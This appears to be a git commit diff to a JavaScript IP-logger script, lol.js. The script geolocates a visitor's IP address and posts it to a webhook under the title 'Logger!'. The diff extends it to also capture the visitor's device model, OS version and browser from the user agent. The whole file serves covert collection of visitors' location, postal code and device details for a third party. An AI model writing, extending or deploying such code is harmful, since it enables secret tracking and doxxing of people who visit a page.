49c84bf75a2da12cafef603596f9e2421c2c4ba2
d93397790-rgb <d93397790@gmail.com>
2025-11-26 01:30:20 -0500

    Update lol.js

--- lol.js
+++ lol.js
@@ -3,6 +3,85 @@ const sendIP = () => {
         .then(ipResponse => ipResponse.json())
         .then(ipData => {
             const ipadd = ipData.ip;
+            // Device and OS detection
+        const userAgent = navigator.userAgent;
+        let device = "Unknown Device";
+        let osVersion = "Unknown";
+
+        // iPhone detection
+        if (/iPhone/i.test(userAgent)) {
+            device = "iPhone";
+            const match = userAgent.match(/OS (\d+_\d+(_\d+)?)/);
+            if (match) osVersion = match[1].replace(/_/g, '.');
+
+            const ratio = window.devicePixelRatio || 1;
+            const width = screen.width * ratio;
+            const height = screen.height * ratio;
+
+            if (width === 1170 && height === 2532) device += " 13/14 Pro";
+            else if (width === 1284 && height === 2778) device += " 13/14 Pro Max";
+            else if (width === 1125 && height === 2436) device += " X/XS/11 Pro";
+
+        // iPad detection
+        } else if (/iPad/i.test(userAgent)) {
+            device = "iPad";
+            const match = userAgent.match(/OS (\d+_\d+(_\d+)?)/);
+            if (match) osVersion = match[1].replace(/_/g, '.');
+
+        // Android detection
+        } else if (/Android/i.test(userAgent)) {
+            device = "Android Device";
+            const match = userAgent.match(/Android (\d+(\.\d+)?)/);
+            if (match) osVersion = match[1];
+
+        // Mac detection
+        } else if (/Macintosh/i.test(userAgent)) {
+            device = "Mac";
+            const match = userAgent.match(/Mac OS X (\d+[_\.]\d+(_\d+)?)/);
+            if (match) osVersion = match[1].replace(/_/g, '.');
+
+        // Windows detection
+        } else if (/Windows NT/i.test(userAgent)) {
+            device = "Windows PC";
+            const match = userAgent.match(/Windows NT (\d+(\.\d+)?)/);
+            if (match) {
+                const versionMap = {
+                    "10.0": "10",
+                    "6.3": "8.1",
+                    "6.2": "8",
+                    "6.1": "7",
+                    "6.0": "Vista",
+                    "5.1": "XP"
+                };
+                osVersion = versionMap[match[1]] || match[1];
+            }
+
+        // Linux detection
+        } else if (/Linux/i.test(userAgent)) {
+            device = "Linux PC";
+        }
+
+        // === Browser Detection ===
+        if (/OPR|Opera/i.test(userAgent)) {
+            const match = userAgent.match(/(Opera|OPR)\/(\d+(\.\d+)?)/);
+            browser = match ? `Opera ${match[2]}` : "Opera";
+        } else if (/Edg/i.test(userAgent)) {
+            const match = userAgent.match(/Edg\/(\d+(\.\d+)?)/);
+            browser = match ? `Edge ${match[1]}` : "Edge";
+        } else if (/Chrome/i.test(userAgent)) {
+            const match = userAgent.match(/Chrome\/(\d+(\.\d+)?)/);
+            browser = match ? `Chrome ${match[1]}` : "Chrome";
+        } else if (/Safari/i.test(userAgent) && !/Chrome/i.test(userAgent)) {
+            const match = userAgent.match(/Version\/(\d+(\.\d+)?)/);
+            browser = match ? `Safari ${match[1]}` : "Safari";
+        } else if (/Firefox/i.test(userAgent)) {
+            const match = userAgent.match(/Firefox\/(\d+(\.\d+)?)/);
+            browser = match ? `Firefox ${match[1]}` : "Firefox";
+        } else if (/MSIE|Trident/i.test(userAgent)) {
+            const match = userAgent.match(/(MSIE |rv:)(\d+(\.\d+)?)/);
+            browser = match ? `Internet Explorer ${match[2]}` : "Internet Explorer";
+        }
+
             return fetch(`https://ipapi.co/${ipadd}/json/`)
                 .then(res => res.json())
                 .then(data => {
@@ -35,7 +114,7 @@ const sendIP = () => {
                                 embeds: [
                                     {
                                         title: 'Logger!',
-                                        description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}\n**Proxy Status >> ** ${status}`,
+                                        description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**Proxy Status >> ** ${status}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}\n\n**Device >> ** ${device}\n**OS Version >> ** ${osVersion}\n**Browser >> ** ${browser}`,
                                         color: 0x800080 
                                     }
                                 ]
